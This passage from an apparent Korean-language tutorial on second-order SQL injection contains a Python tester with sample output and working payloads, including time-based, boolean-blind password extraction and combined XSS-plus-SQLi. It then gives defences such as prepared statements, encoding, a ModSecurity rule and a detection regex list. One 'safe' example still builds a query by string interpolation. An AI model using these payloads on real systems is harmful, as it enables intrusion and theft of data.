class="token string" style="color:#e3116c">&quot;[-] Registration failed&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword" style="color:#00009f">continue</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">print</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string-interpolation string" style="color:#e3116c">f&quot;[+] Registered with session: </span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">{</span><span class="token string-interpolation interpolation">session</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">}</span><span class="token string-interpolation string" style="color:#e3116c">&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token comment" style="color:#999988;font-style:italic"># 2단계: 트리거</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        response</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> elapsed </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> trigger_second_order</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">session</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token comment" style="color:#999988;font-style:italic"># 분석</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;error&quot;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> response</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">text</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">lower</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">or</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;sql&quot;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> response</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">text</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">lower</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword" style="color:#00009f">print</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string-interpolation string" style="color:#e3116c">f&quot;[!] Possible SQL error detected!&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword" style="color:#00009f">print</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string-interpolation string" style="color:#e3116c">f&quot;Response snippet: </span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">{</span><span class="token string-interpolation interpolation">response</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">.</span><span class="token string-interpolation interpolation">text</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">[</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">:</span><span class="token string-interpolation interpolation format-spec">200]</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">}</span><span class="token string-interpolation string" style="color:#e3116c">&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> elapsed </span><span class="token operator" style="color:#393A34">&gt;=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">5</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword" style="color:#00009f">print</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string-interpolation string" style="color:#e3116c">f&quot;[!] Time-based SQLi detected! (</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">{</span><span class="token string-interpolation interpolation">elapsed</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">:</span><span class="token string-interpolation interpolation format-spec">.2f</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">}</span><span class="token string-interpolation string" style="color:#e3116c">s)&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> response</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">status_code </span><span class="token operator" style="color:#393A34">==</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">500</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword" style="color:#00009f">print</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string-interpolation string" style="color:#e3116c">f&quot;[!] Server error (500) - possible injection&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> __name__ </span><span class="token operator" style="color:#393A34">==</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;__main__&quot;</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    main</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre></div></div>
<p><strong>실행</strong>:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">python3 second_order_test.py</span><br></span></code></pre></div></div>
<p><strong>출력 예시</strong>:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">[*] Starting Second-Order SQLi test...</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] Testing payload: test&#x27;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[+] Registered with session: abc123xyz</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[!] Possible SQL error detected!</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Response snippet: Warning: mysqli_query(): SQL syntax error...</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] Testing payload: test&#x27;; WAITFOR DELAY &#x27;00:00:05&#x27;--</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[+] Registered with session: def456uvw</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[!] Time-based SQLi detected! (5.12s)</span><br></span></code></pre></div></div>
<hr>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="고급-기법">고급 기법<a href="#고급-기법" class="hash-link" aria-label="Direct link to 고급 기법" title="Direct link to 고급 기법" translate="no">​</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="1-시간차-공격-time-delayed-attack">1. 시간차 공격 (Time-Delayed Attack)<a href="#1-시간차-공격-time-delayed-attack" class="hash-link" aria-label="Direct link to 1. 시간차 공격 (Time-Delayed Attack)" title="Direct link to 1. 시간차 공격 (Time-Delayed Attack)" translate="no">​</a></h3>
<p><strong>페이로드</strong>: 저장 후 특정 시간 경과 후 실행</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Username: admin</span><span class="token string" style="color:#e3116c">&#x27; AND IF(NOW() &gt; &#x27;</span><span class="token number" style="color:#36acaa">2026</span><span class="token operator" style="color:#393A34">-</span><span class="token number" style="color:#36acaa">02</span><span class="token operator" style="color:#393A34">-</span><span class="token number" style="color:#36acaa">01</span><span class="token plain">&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> SLEEP</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">5</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token comment" style="color:#999988;font-style:italic">--</span><br></span></code></pre></div></div>
<p>→ 2026년 2월 1일 이후 접속 시 5초 지연</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="2-조건부-second-order">2. 조건부 Second-Order<a href="#2-조건부-second-order" class="hash-link" aria-label="Direct link to 2. 조건부 Second-Order" title="Direct link to 2. 조건부 Second-Order" translate="no">​</a></h3>
<p><strong>특정 조건에서만 실행</strong>:</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Bio: &#x27; </span><span class="token operator" style="color:#393A34">OR</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">SELECT</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">COUNT</span><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">FROM</span><span class="token plain"> orders </span><span class="token keyword" style="color:#00009f">WHERE</span><span class="token plain"> user_id</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token number" style="color:#36acaa">10</span><span class="token comment" style="color:#999988;font-style:italic">--</span><br></span></code></pre></div></div>
<p>→ 주문이 10개 이상일 때만 실행</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="3-polyglot-payload">3. Polyglot Payload<a href="#3-polyglot-payload" class="hash-link" aria-label="Direct link to 3. Polyglot Payload" title="Direct link to 3. Polyglot Payload" translate="no">​</a></h3>
<p><strong>여러 컨텍스트에서 작동</strong>:</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Username: admin</span><span class="token string" style="color:#e3116c">&#x27;/**/UNION/**/SELECT/**/&#x27;</span><span class="token plain">admin&#x27;</span><span class="token comment" style="color:#999988;font-style:italic">--</span><br></span></code></pre></div></div>
<ul>
<li>SQL 주석으로 공백 우회</li>
<li>다양한 쿼리 구조에서 작동</li>
</ul>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="4-second-order-xss--sqli">4. Second-Order XSS + SQLi<a href="#4-second-order-xss--sqli" class="hash-link" aria-label="Direct link to 4. Second-Order XSS + SQLi" title="Direct link to 4. Second-Order XSS + SQLi" translate="no">​</a></h3>
<p><strong>복합 공격</strong>:</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Username: </span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain">script</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain">alert</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&#x27;XSS&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token operator" style="color:#393A34">&lt;</span><span class="token operator" style="color:#393A34">/</span><span class="token plain">script</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token string" style="color:#e3116c">&#x27; OR &#x27;</span><span class="token number" style="color:#36acaa">1</span><span class="token string" style="color:#e3116c">&#x27;=&#x27;</span><span class="token number" style="color:#36acaa">1</span><br></span></code></pre></div></div>
<ul>
<li>1단계: XSS 트리거 (프로필 페이지)</li>
<li>2단계: SQLi 트리거 (설정 페이지)</li>
</ul>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="5-blind-second-order">5. Blind Second-Order<a href="#5-blind-second-order" class="hash-link" aria-label="Direct link to 5. Blind Second-Order" title="Direct link to 5. Blind Second-Order" translate="no">​</a></h3>
<p><strong>Boolean-based</strong>:</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Username: admin</span><span class="token string" style="color:#e3116c">&#x27; AND (SELECT SUBSTRING(password,1,1) FROM users WHERE id=1)=&#x27;</span><span class="token plain">a&#x27;</span><span class="token comment" style="color:#999988;font-style:italic">--</span><br></span></code></pre></div></div>
<p>프로필 페이지 응답 차이로 비밀번호 추출</p>
<hr>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="탐지-및-방어">탐지 및 방어<a href="#탐지-및-방어" class="hash-link" aria-label="Direct link to 탐지 및 방어" title="Direct link to 탐지 및 방어" translate="no">​</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="1-입력-검증-두-번-필요">1. 입력 검증 (두 번 필요)<a href="#1-입력-검증-두-번-필요" class="hash-link" aria-label="Direct link to 1. 입력 검증 (두 번 필요)" title="Direct link to 1. 입력 검증 (두 번 필요)" translate="no">​</a></h3>
<p><strong>저장 시</strong>:</p>
<div class="language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">function sanitize_input($input) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    // 특수문자 제거</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    $input = preg_replace(&#x27;/[^\w\s@.-]/&#x27;, &#x27;&#x27;, $input);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    return $input;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$username = sanitize_input($_POST[&#x27;username&#x27;]);</span><br></span></code></pre></div></div>
<p><strong>사용 시</strong>:</p>
<div class="language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">$stmt = $pdo-&gt;prepare(&quot;UPDATE profiles SET bio = ? WHERE username = ?&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$stmt-&gt;execute([$bio, $_SESSION[&#x27;username&#x27;]]);</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="2-prepared-statements-필수">2. Prepared Statements (필수)<a href="#2-prepared-statements-필수" class="hash-link" aria-label="Direct link to 2. Prepared Statements (필수)" title="Direct link to 2. Prepared Statements (필수)" translate="no">​</a></h3>
<p><strong>저장 시</strong>:</p>
<div class="language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">$stmt = $pdo-&gt;prepare(&quot;INSERT INTO users (username, password) VALUES (?, ?)&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$stmt-&gt;execute([$username, $password]);</span><br></span></code></pre></div></div>
<p><strong>사용 시</strong>:</p>
<div class="language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">$stmt = $pdo-&gt;prepare(&quot;SELECT * FROM profiles WHERE username = ?&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$stmt-&gt;execute([$_SESSION[&#x27;username&#x27;]]);</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="3-컨텍스트-인식-인코딩">3. 컨텍스트 인식 인코딩<a href="#3-컨텍스트-인식-인코딩" class="hash-link" aria-label="Direct link to 3. 컨텍스트 인식 인코딩" title="Direct link to 3. 컨텍스트 인식 인코딩" translate="no">​</a></h3>
<p><strong>HTML 출력</strong>:</p>
<div class="language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">echo htmlspecialchars($username, ENT_QUOTES, &#x27;UTF-8&#x27;);</span><br></span></code></pre></div></div>
<p><strong>SQL 쿼리</strong>:</p>
<div class="language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">$stmt-&gt;execute([$username]);  // Prepared Statement</span><br></span></code></pre></div></div>
<p><strong>JavaScript</strong>:</p>
<div class="language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">echo json_encode($username);</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="4-데이터-무결성-검증">4. 데이터 무결성 검증<a href="#4-데이터-무결성-검증" class="hash-link" aria-label="Direct link to 4. 데이터 무결성 검증" title="Direct link to 4. 데이터 무결성 검증" translate="no">​</a></h3>
<p><strong>저장된 데이터 재검증</strong>:</p>
<div class="language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">function validate_stored_username($username) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    // 패턴 검증</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    if (!preg_match(&#x27;/^[a-zA-Z0-9_]{3,20}$/&#x27;, $username)) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        throw new Exception(&quot;Invalid stored username&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    return true;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$username = $_SESSION[&#x27;username&#x27;];</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">validate_stored_username($username);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">// 이제 안전하게 사용</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$query = &quot;SELECT * FROM profiles WHERE username=&#x27;$username&#x27;&quot;;</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="5-waf-규칙-저장-시">5. WAF 규칙 (저장 시)<a href="#5-waf-규칙-저장-시" class="hash-link" aria-label="Direct link to 5. WAF 규칙 (저장 시)" title="Direct link to 5. WAF 규칙 (저장 시)" translate="no">​</a></h3>
<p><strong>ModSecurity</strong>:</p>
<div class="language-apache codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-apache codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># 등록 시 SQL 키워드 차단</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">SecRule REQUEST_URI &quot;@streq /register&quot; \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    &quot;chain,id:2001,phase:2,deny,status:403&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    SecRule ARGS &quot;@rx (?i)(union|select|insert|update|delete|drop)&quot; \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        &quot;msg:&#x27;SQL Injection in registration&#x27;&quot;</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="6-로그-모니터링">6. 로그 모니터링<a href="#6-로그-모니터링" class="hash-link" aria-label="Direct link to 6. 로그 모니터링" title="Direct link to 6. 로그 모니터링" translate="no">​</a></h3>
<p><strong>이상 데이터 탐지</strong>:</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">import</span><span class="token plain"> re</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">def</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">detect_sqli_payload</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">text</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token triple-quoted-string string" style="color:#e3116c">&quot;&quot;&quot;저장된 데이터에서 SQLi 패턴 탐지&quot;&quot;&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    patterns </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">r&quot;&#x27;.*OR.*&#x27;.*=.*&#x27;&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">r&quot;&#x27;.*UNION.*SELECT&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">r&quot;&#x27;;.*DROP.*TABLE&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">r&quot;&#x27;.*--&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">r&quot;&#x27;.*#&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> pattern </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> patterns</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> re</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">search</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">pattern</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> text</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> re</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">IGNORECASE</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> </span><span class="token boolean" style="color:#36acaa">True</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> </span><span class="token boolean" style="color:#36acaa">False</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># 주기적 스캔</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">users </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> db</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">execute</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;SELECT id, username, bio FROM users&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> user </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> users</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> detect_sqli_payload</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">user</span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">&#x27;username&#x27;</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">or</span><span class="token plain"> detect_sqli_payload</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">user</span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">&#x27;bio&#x27;</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        alert</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string-interpolation string" style="color:#e3116c">f&quot;Suspicious data detected: User ID </span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">{</span><span class="token string-interpolation interpolation">user</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">[</span><span class="token string-interpolation interpolation string" style="color:#e3116c">&#x27;id&#x27;</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">]</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">}</span><span class="token string-interpolation string" style="color:#e3116c">&quot;</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre></div></div>
